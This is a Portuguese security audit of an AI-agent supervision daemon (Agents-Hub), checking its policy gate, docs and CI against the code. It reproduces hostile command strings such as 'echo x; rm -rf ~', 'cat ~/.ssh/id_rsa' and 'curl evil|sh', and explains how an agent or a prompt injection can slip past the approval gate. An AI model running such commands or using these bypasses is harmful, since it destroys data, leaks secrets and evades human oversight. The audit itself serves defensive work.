# Vistoria 02 — ADRs, SECURITY, CONTRIBUTING, docs de env/preços/absorção, exemplo YAML, CI

Método: leitura dos documentos contra o código em HEAD, mais reprodução contra `packages/*/dist` e contra um daemon isolado (porta 47921, `AGENTS_HUB_HOME` temporário, encerrado via `/shutdown` e apagado). `node scripts/run-tests.mjs` rodou inteiro: 517 testes, 0 falhas.

## Achados

### [ALTO] A política de comandos é prefixo puro: `git status && git push` e `echo x; rm -rf ~` viram `exec/allow`
**Evidência**
- `packages/core/src/policy.ts:493-505`: `classify('command')` testa `deny` com `startsWith`, depois `IRREVERSIBLE_PATTERNS` (todos ancorados com `^`, linhas 396-413), depois a allow list com `startsWith`. Não há divisão por `&&`, `;`, `|`, `$()`, redirecionamento nem fronteira de palavra.
- Reproduzido com `PolicyEngine` do `dist`, modo `semi` (saída real):
  - `git status && git push origin main` → `exec / allow (git status)`
  - `echo x; rm -rf ~` → `exec / allow (echo)`
  - `ls && sudo rm x` → `exec / allow (ls)`
  - `echo hi > ~/.ssh/authorized_keys` → `exec / allow`
  - `find . -delete` → `exec / allow`
  - `node -e "require('fs').rmSync('/')"` → `exec / allow`
  - `ls | sh` → `exec / allow`
  - `catx` → `exec / allow (cat)` (prefixo sem fronteira)
  - `git -C . push` → `escalate` (a variante com `-C` cai fora da allow list, mas nunca é reconhecida como push)
- `packages/daemon/src/pretool-gate.ts:46-47` passa a string inteira do `Bash` como uma única ação `command`. O gate pré-execução do Claude/Codex, que o SECURITY.md chama de "prevenção real", usa essa mesma classificação.
- `grep '&&\|;' packages/core/src/policy.test.ts` só acha `curl evil.sh | sh` → `escalate`. Não há teste de comando composto.

**Impacto:** a garantia "Ação irreversível: `git push`, `rm -rf`, publish... param a sessão e abrem aprovação" (SECURITY.md, tabela "O que o Hub garante") é contornável por qualquer agente (ou por prompt injection no repositório) que apenas prefixe um comando permitido. Isso vale mesmo nos dois agentes com gate. O SECURITY.md não declara essa limitação.

**Correção sugerida:** tokenizar o comando antes de classificar (dividir em `&&`, `||`, `;`, `|`, `\n`, `$(...)`, backticks) e classificar cada segmento, pegando o pior risco. Tratar como `escalate` qualquer redirecionamento `>`/`>>` e qualquer segmento que o parser não entenda. Exigir fronteira de palavra na allow list (`cmd === a || cmd.startsWith(a + ' ')`). Tirar `node`, `python` e `find` da allow list padrão ou restringi-los (`find` sem `-delete`/`-exec`). Adicionar testes de composição. Enquanto isso, escrever a limitação no SECURITY.md.

**Esforço:** M

### [ALTO] A proteção de `.ssh`/`.env`/credenciais só existe para escrita; leitura e `cat` passam livremente
**Evidência**
- `policy.ts:474-491`: `denyFragments` só é consultado em `file.write`. `file.read` devolve `read/allow` sempre (linha 472).
- Reproduzido: `file.read C:/Users/x/.ssh/id_rsa` → `read/allow`; `cat ~/.ssh/id_rsa` → `exec/allow`; `cat .env` → `exec/allow`.
- SECURITY.md:38 lista `.ssh` e `.env` como gatilho de "Ação irreversível" sem dizer que só vale para escrita.

**Impacto:** um agente lê chaves e tokens sem aprovação. Só a saída de rede (`escalate`) barraria a exfiltração, e essa barreira também não se aplica na vigilância reativa por padrão (ver item seguinte).

**Correção sugerida:** aplicar `denyFragments` também a `file.read` (risco `escalate`, ou `irreversible` se preferirem tratar como segredo) e a argumentos de comandos de leitura. No mínimo, ajustar o SECURITY.md para "escrita em".

**Esforço:** P (leitura) / M (comandos)

### [ALTO] O gate pré-execução falha aberto por desenho e o SECURITY.md não diz; o CONTRIBUTING chama isso de "o bug"
**Evidência**
- `packages/cli/src/hook.ts:60-91`: qualquer exceção do `gateToolCall` (daemon desligado, timeout, 4xx/5xx) devolve `allow` (`'Agents-Hub indisponível — sem política a aplicar'`).
- `POST /hooks/pretooluse` sem sessão do Hub devolveu `allow` (`"chamada fora de uma sessão do Hub"`, reproduzido).
- CONTRIBUTING.md:3-8 apresenta como incidente "o gate ... respondendo com uma Promise serializada como `{}` — ou seja, falhando aberto". Hoje o mesmo resultado ocorre por design se o daemon cair no meio da sessão.
- O ADR 03 e o SECURITY.md (tabela dos 3 níveis) descrevem o gate como "prevenção real" sem a ressalva.
- Além disso, o gate do Claude depende de `hub hooks install claude --write`. O SECURITY.md só cita a dependência para o Codex.

**Impacto:** quem lê "Claude Code tem gate: Sim" acha que a sessão fica protegida. Se o daemon cair, o gate morre em silêncio. O texto sobre "falhar aberto" no CONTRIBUTING contradiz o comportamento atual.

**Correção sugerida:** documentar no SECURITY.md (a) fail-open quando o daemon não responde, (b) necessidade de instalar o hook para o Claude, (c) o hook só age em sessões criadas pelo Hub. Opcional: modo `strict` (`AGENTS_HUB_SESSION_ID` presente + daemon inacessível → `deny`), pois nesse caso o Hub está inequivocamente envolvido. Reformular o parágrafo do CONTRIBUTING para "falhava aberto com o daemon respondendo".

**Esforço:** P (docs) / M (modo strict)

### [ALTO] Config de projeto "só aperta" é falsa para orçamento, timeouts, retries e comando de validação (execução de código do repositório clonado)
**Evidência**
- SECURITY.md:41: "só pode **apertar** a política global, nunca afrouxar".
- `policy.ts:249-305` (`mergePolicyLayer` com `clampToBase: true`) trava `risk`, `commands`, `paths`, `watch`, `maxDepth`/concorrência, mas não trava `defaultBudget`, `taskTimeoutSeconds`, `sessionTimeoutSeconds`, `heartbeatTimeoutSeconds`, `retries`, `fallback` nem `validation.command` (só `base ?? layer`).
- Reproduzido com o `dist`:
  `mergePolicyLayer(DEFAULT_POLICY, {defaultBudget:{usd:9999,...}, taskTimeoutSeconds:999999, retries:{max:50}, validation:{command:'curl evil|sh'}}, {clampToBase:true})`
  → `{usd:9999, tokens:999999999, seconds:999999}`, timeout 999999, `retries.max 50`, `validation.command = 'curl evil|sh'`.
- `packages/daemon/src/validation.ts:46-50` executa o comando com `spawn(command, { shell: true })`. Pelo desenho (`project-config.ts`), o `<repo>/.agents-hub/config.yaml` é versionado e vem junto de qualquer `git clone`.

**Impacto:** um repositório hostil eleva o teto de gasto do orçamento (ADR 03.2) e faz o daemon rodar um comando shell arbitrário, com o seu usuário e sem aprovação, quando o portão de validação executar. A frase "config hostil só aperta" está errada para esses campos.

**Correção sugerida:** em `clampToBase` usar `Math.min` para `defaultBudget.*`, timeouts e `retries.max`. Para `validation.command`: aceitar só se base já definir, ou classificar o comando pela `PolicyEngine`/exigir aprovação na primeira execução por projeto (hash do comando). Documentar no SECURITY.md que `validation.command`, `prompts`/`memory` e `env` de um repo clonado são código/entrada confiável. Adicionar teste "layer não eleva orçamento/timeout".

**Esforço:** M

### [MÉDIO] `/discovery` "nunca devolve segredo" não vale para `args` e para query strings fora da lista
**Evidência**
- docs/11-descoberta-e-absorcao.md:59-61 ("Segredo nunca sai"), `packages/daemon/src/absorption.ts:50-64` (`sanitizeDiscovery`) só mascara `env` e `url`.
- Reproduzido: `sanitizeDiscovery` com `args:['mcp-remote','https://h/mcp','--header','Authorization: Bearer sk-abcdefghijklmnopqrstuvwx']` devolveu o args intacto. `url:'https://h/mcp?sig=SEGREDOLONGO123'` também saiu intacta (`redactUrl` só conhece `key|token|api_key|apikey|access_token|secret`).
- Nas configs reais desta máquina o `env` saiu mascarado (`***`) e não achei segredo literal na saída (verificado), então o vazamento é potencial, não ocorrido.

**Impacto:** qualquer processo local ou página com Origin permitida lê `GET /discovery` e obtém tokens que o usuário deixou em `args` de servidores MCP (padrão comum em `mcp-remote --header`).

**Correção sugerida:** passar `args` por `looksLikeSecret` e mascarar o argumento seguinte a `--header`/`--api-key`/`--token`; ampliar `redactUrl` (`sig`, `signature`, `auth`, `password`, `sas`...). Ajustar a frase do documento para o que é de fato coberto.

**Esforço:** P

### [MÉDIO] SECURITY.md não menciona vetores reais que o código já reconhece (BASE_URL, prompts/memory do repo, env de projeto)
**Evidência**
- `packages/core/src/agent-env.ts:25-40` documenta que `*_BASE_URL` no `config.yaml` de um repo clonado permite sequestrar o canal de API do agente (vaza o token nativo do usuário). O SECURITY.md não cita.
- `filtrarEnvDeProjeto` aceita por prefixo `ANTHROPIC_`, `OPENAI_`, `GOOGLE_`... (`agent-env.ts:52-70`), portanto também `OPENAI_API_KEY`/`GOOGLE_APPLICATION_CREDENTIALS` num arquivo versionado. docs/11 diz "nunca valores com cara de segredo", mas o filtro é só por nome. A checagem de segredo (`looksLikeSecret`) só existe no caminho `hub import`, não em `PUT /projects/:id/context`.
- SECURITY.md:70-71 diz "o Hub nunca lê, persiste nem repassa segredo". Porém `config.yaml` de projeto persiste env por agente, e a importação (`--include-env`) copia env de servidores MCP com o valor real para outro agente.

**Impacto:** o modelo de ameaça publicado subestima a superfície "repositório hostil". A frase "nunca persiste segredo" tem exceções que dependem só da disciplina do usuário.

**Correção sugerida:** acrescentar seção "Config de projeto é entrada não confiável" (BASE_URL, prompts, validation.command, memory). Rodar `looksLikeSecret` em `env`/`prompts` também na rota `PUT context`. Reescrever a garantia de credenciais como "o Hub não lê os arquivos de credencial dos CLIs; env informado pelo usuário é persistido em texto".

**Esforço:** P/M

### [MÉDIO] Retenção documentada ("para sempre", payload bruto preservado, sem expurgo) não bate com o código
**Evidência**
- SECURITY.md:150-153: "Eventos ficam no SQLite para sempre, com o payload bruto preservado (ADR 06.3)... Não há comando de expurgo".
- `packages/daemon/src/config.ts:85-98`: `rawEventDays: 7` por padrão; `event-retention.ts` compacta `events.raw_json` (vira `NULL`) 7 dias depois do fim da sessão, com timer de 60 min; existe `hub sweep` (`cli/src/main.ts:1206`) que remove worktrees.
- ADR 06 (docs/decisoes/06-resiliencia-retencao.md) mostra `"rawPayloads": "forever"`, `"events": "forever"` e um `config.json` cujas chaves não existem no schema real (`retention` real: `worktreeDays`, `sweepIntervalMinutes`, `rawEventDays`, `config.ts:153-158`). O schema é `.passthrough()`, então essas chaves são ignoradas em silêncio.
- O `payload_json` continua para sempre (coerente com o comentário em `config.ts`), sem comando de expurgo — essa parte do SECURITY.md está correta.

**Impacto:** um usuário que copia o exemplo do ADR 06 acredita ter configurado retenção e não configurou. O SECURITY.md promete preservação do bruto que o código descarta (o efeito é favorável à privacidade, mas o documento está errado).

**Correção sugerida:** atualizar ADR 06 e SECURITY.md para `rawEventDays` (7) e a chave real; anotar que a compactação foi uma emenda ao ADR 06.3. Opcional: rejeitar/avisar chaves desconhecidas em `retention`.

**Esforço:** P

### [MÉDIO] O ADR 06.2 (cadeia de fallback) e ADR 06.4/01 divergem do padrão do código
**Evidência**
- ADR 06.2: cadeia global `claude → codex → opencode`, exemplo com 5 capabilities.
- `policy.ts:383-391`: 7 capabilities, com `openclaude` na cadeia (acrescentado "por dedução" e "NUNCA exercitado", comentário em `policy.ts:377-382`), `planning: ['claude','codex']`, `code-review: ['claude','codex','openclaude']`.
- ADR 01.4 fala em 8 agentes; o registro tem 9 (SECURITY.md já diz 9). ADR 01.2/03.3 prometem TUI; não existe pacote TUI (`ls packages`), o roadmap marca `[ ]` (docs/02-roadmap.md:280).
- ADR 03.4 usa `acceptance_criteria`/`context_refs` (snake_case); o código usa `acceptanceCriteria`/`contextRefs` (`brief.ts`), e `agent.call`/`agent.status` (ADR 02.1) são `hub_agent_call`/`hub_agent_status`.

**Impacto:** o ADR é a fonte de decisão, mas o comportamento efetivo (inclusive um agente nunca exercitado no fallback) não tem emenda registrada.

**Correção sugerida:** adicionar seção "Emendas" nos ADRs 01, 03 e 06 (agentes 9, openclaude no fallback, sem TUI, nomes reais do contrato) ou marcar os exemplos como ilustrativos.

**Esforço:** P

### [MÉDIO] CONTRIBUTING desatualizado: "30 arquivos, 273 testes" e "portão" promete mais do que o CI executa
**Evidência**
- CONTRIBUTING.md (tabela de comandos): `npm test` = "30 arquivos, 273 testes". Real: `node scripts/run-tests.mjs` → 63 arquivos `.test.js` e 517 testes (`ℹ tests 517`, `pass 517`). O comentário em `scripts/run-tests.mjs` ainda diz "29 arquivos".
- CONTRIBUTING diz "`npm run verify` é o mesmo que o CI roda". O CI (`.github/workflows/ci.yml`) roda `build:packages`, `build` do web e `npm test`, equivalente, mas sem `npm run typecheck` do web como passo separado (o `build` do web já faz `tsc --noEmit && vite build`, então ok).
- Nenhum workflow roda lint; não há lint no repositório (não é prometido).
- CONTRIBUTING lista "Antes de abrir PR" com checklist, mas não há `.github/pull_request_template.md`, CODEOWNERS nem dependabot.
- `ci.yml`: sem bloco `permissions:` (token com permissões padrão), actions por tag (`@v4`) e não por SHA; `concurrency` com `cancel-in-progress: true` também em `push` para `main` cancela a execução do commit anterior em main, deixando-o sem veredito.
- `npm run clean` (`tsc -b --clean`) não apaga `packages/web/dist` nem outputs do vite; CONTRIBUTING diz "apaga `dist/` e `.tsbuildinfo`".
- Não conseguí confirmar se o CI já rodou verde no GitHub (sem acesso ao remoto). A parte do Node 22.5 é afirmada em comentário e não reproduzida por mim.

**Impacto:** o número errado enfraquece o argumento central do documento (portão que cobre o que diz cobrir). O resto é dívida de higiene.

**Correção sugerida:** atualizar os números (ou remover a contagem), ajustar o comentário de `run-tests.mjs`, adicionar `permissions: contents: read`, `cancel-in-progress: ${{ github.ref != 'refs/heads/main' }}`, template de PR com o checklist.

**Esforço:** P

### [MÉDIO] docs/09: "validadas num lugar só" é falso; MCP e CLI leem `process.env` cru e `NaN` volta a existir
**Evidência**
- docs/09-variaveis-de-ambiente.md:3-7 e `packages/daemon/src/env.ts:4-13` dizem que todas as variáveis são lidas e validadas por `readHubEnv`.
- `packages/mcp/src/main.ts:16,20-21,43`: `AGENTS_HUB_URL`, `AGENTS_HUB_MCP_AGENT` e `Number(process.env['AGENTS_HUB_MCP_GRACE_MS'] ?? 3000)` lidos crus; `AGENTS_HUB_MCP_GRACE_MS=abc` → `NaN`, e em `shutdown` `grace > 0` é falso, então a carência some em silêncio (exatamente o modo de falha descrito no cabeçalho de `env.ts`).
- `packages/cli/src/daemon-control.ts:35` lê `AGENTS_HUB_NO_AUTOSTART` cru (`=== '1'`); `packages/web/vite.config.ts:25` lê `AGENTS_HUB_URL` cru.
- O que está certo: as 6 variáveis do doc existem e são lidas (`HOME`, `PORT`, `NO_AUTOSTART`, `URL`, `MCP_AGENT`, `MCP_GRACE_MS`), e `PORT` é validada por `readHubEnv` no daemon e em `hub daemon` (`daemon-run.ts:20-29`).
- O doc diz "Quando o daemon não está no ar todo comando... ver `packages/cli/src/daemon-control.ts`": correto. Também correto: as variáveis internas `AGENTS_HUB_SESSION_ID/AGENT_ID/TASK_ID` (`process-adapter.ts:215-217`). O texto do doc cita que `AGENTS_HUB_URL` é usado pelo "proxy de dev da Web UI": correto.
- SECURITY.md:118 fala em "Expor `AGENTS_HUB_PORT`/`host` para fora do loopback". `host` não é variável de ambiente (só chave de `config.json`, `config.ts:147`), e mudar a porta não expõe nada.

**Impacto:** valor mal formado em `AGENTS_HUB_MCP_GRACE_MS`/`AGENTS_HUB_URL` gera comportamento silenciosamente errado no MCP.

**Correção sugerida:** o MCP e a CLI passarem por `readHubEnv` (ou mover `env.ts` para `core` e importar dos dois lados); o doc citar `host` de `config.json` separado de `AGENTS_HUB_PORT`.

**Esforço:** P

### [BAIXO] JSON malformado devolve 500 `INTERNAL` com a mensagem do parser
**Evidência:** `curl -X POST -H "Content-Type: application/json" -d '{bad' /sessions` → `{"error":{"code":"INTERNAL","message":"Expected property name or '}' in JSON at position 1..."}} 500`. `readJson` (`server.ts:830-841`) faz `JSON.parse` fora do `try` que traduz erro de contrato (422). O SECURITY.md promete "corpo malformado" tratado por Zod.
**Impacto:** cliente recebe 500 e o log do daemon registra falha de servidor por entrada inválida; ruído de auditoria.
**Correção sugerida:** capturar o `SyntaxError` em `readJson` e lançar `HubError('INVALID_BRIEF', 'JSON inválido')` (422/400). **Esforço:** P

### [BAIXO] POST sem corpo e sem `Content-Type` é recusado com 415
**Evidência:** `curl -X POST http://127.0.0.1:47921/sessions` → 415 "corpo precisa ser application/json". `guard.ts` considera `temCorpo` quando falta `content-length` (`primeiro(...) !== '0'`). Clientes que mandam POST sem corpo e sem `Content-Length: 0` (ex.: `curl -X POST .../shutdown` sem `-d`) falham; as instruções da equipe já usam `-d "{}"`.
**Impacto:** atrito, não falha de segurança. **Correção sugerida:** tratar ausência de `content-length` e de `transfer-encoding` como "sem corpo". **Esforço:** P

### [BAIXO] docs/10 e precos-modelos.md dizem que só o Claude Code reporta dólar; o OpenCode também reporta
**Evidência:** `docs/10-manutencao-de-precos.md:12-14` e `docs/referencias/precos-modelos.md` ("Cursor, Copilot, OpenCode... não reportam") contra `docs/referencias/opencode-api.md:162,187-192`: `session.next.step.ended` traz `cost` mapeado para `EventCost.usd`. Além disso, o doc 10 fala em "os outros oito agentes" e lista sete. `PRICING_COLLECTED_AT = '2026-08-27'` (29 dias; dentro do gatilho trimestral, sem revisão pendente).
**Impacto:** só documentação. **Correção sugerida:** ajustar a lista de agentes que dependem da tabela. **Esforço:** P

### [BAIXO] Exemplo YAML: válido, mas a descrição promete paralelismo que ele não tem
**Evidência:** `hub workflow validate examples/multi-agent-pipeline.yaml` → válido, rc 0, 4 lotes de 1 passo cada. O `description` diz "passos sequenciais e paralelos", mas todos os `dependsOn` formam cadeia linear. Campos `supervision`, `isolation`, `budget`, `acceptanceCriteria` existem no schema e são repassados no `run` (`cli/src/workflow-cmd.ts:117-127`). Não executei `workflow run` (custa agentes reais).
**Correção sugerida:** trocar a descrição ou dividir `test_suite` em dois passos paralelos. **Esforço:** P

### [BAIXO] Dois exports de sessão soltos na raiz, não ignorados pelo `.gitignore`
**Evidência:** `git status` mostra `?? 2026-09-23-124001-voc-est-assumindo-o-desenvolvimento-do-agents-h.txt` (362 KB, 1 ocorrência do padrão `api[_-]?key`) e `?? outra-sessao-claude.txt`. O `.gitignore` só cobre `session-export-*/`, e o próprio comentário explica que esses transcritos não devem ser versionados.
**Impacto:** um `git add -A` publicaria transcrito de sessão. **Correção sugerida:** ignorar `20*-*.txt`/`outra-sessao-*.txt` ou movê-los para fora do repositório. **Esforço:** P

## Verificado OK
- Guard do daemon (SECURITY.md, `guard.ts`): `Host: evil.com` e `Host: 127.0.0.1.evil.com:47921` → 403; `Origin: http://evil.com` → 403; POST `text/plain` → 415. Daemon escuta só em `127.0.0.1` (netstat).
- Traversal na Web UI: `%2e%2e/`, `..%5c..%5c`, `..%2f` contra `serveStatic` → 403/404, nenhum arquivo fora da UI servido; teste unitário e comparação por caminho relativo (`static.ts:56-59`).
- Schemas Zod estritos: `POST /sessions` e `POST /approvals/:id` rejeitam chave desconhecida com 422 apontando o campo; 14 `.strict()` em `http-schemas.ts`.
- Interseção pai→filho (`PolicyEngine.intersect`), ciclo semântico e profundidade (`graph.ts`), orçamento da raiz (`budget.ts`): código coerente com ADR 03; existem testes (`policy.test.ts`, `graph.test.ts`, `budget.test.ts`).
- ADR 04.1: `hub start` sem `--agent` recusa ("--agent é obrigatório... ADR 04.1"). ADR 06.1/06.3: worktree removido e branch `hub/<id>` preservado (`worktree.ts:181-200`); `worktreeDays` 7 confere; task morre em `failed`.
- Codex `supervised` recusa abrir sem bypass (`session-manager.ts:1559-1580`, `CODEX_GATE_NOT_GUARANTEED`) e o bypass só é gravável em `~/.agents-hub/config.json`. A tabela dos 9 agentes no SECURITY.md (só Claude e Codex com gate; mimo/cursor sem eventos estruturados por `generic-json`) está consistente com os manifestos.
- `filtrarEnvDeProjeto`: allowlist por prefixo/nome, `AGENTS_HUB_` excluído, `NODE_OPTIONS`/`PATH` recusados (lê-se em `agent-env.ts`).
- `hub discover --json` real: `env` de servidores MCP saiu com valores `***`; nenhum segredo literal na saída.
- docs/09: as 6 variáveis existem e as 3 internas são de fato injetadas. `AGENTS_HUB_PORT` inválida é recusada pelo daemon.
- CI: matriz Windows Node 22.5/24, `npm ci`, build limpo, teste, checagem de árvore suja, job agregador `portao-de-qualidade` com `if: always()` e `needs: [verificar]` (resultado != success falha), Linux e `npm audit` informativos: batem com o descrito no CONTRIBUTING. `scripts/run-tests.mjs` descobre os testes em JS e falha com suíte vazia.
- `hub workflow validate examples/multi-agent-pipeline.yaml`: válido, ordem topológica correta.
- `docs/referencias/opencode-openapi.json`: JSON válido, OpenAPI 3.1.0, 162 paths e 472 schemas, batendo com o cabeçalho de `opencode-api.md`.
- Suíte completa: 517 testes, 0 falhas. Daemon isolado encerrado e diretório temporário removido.
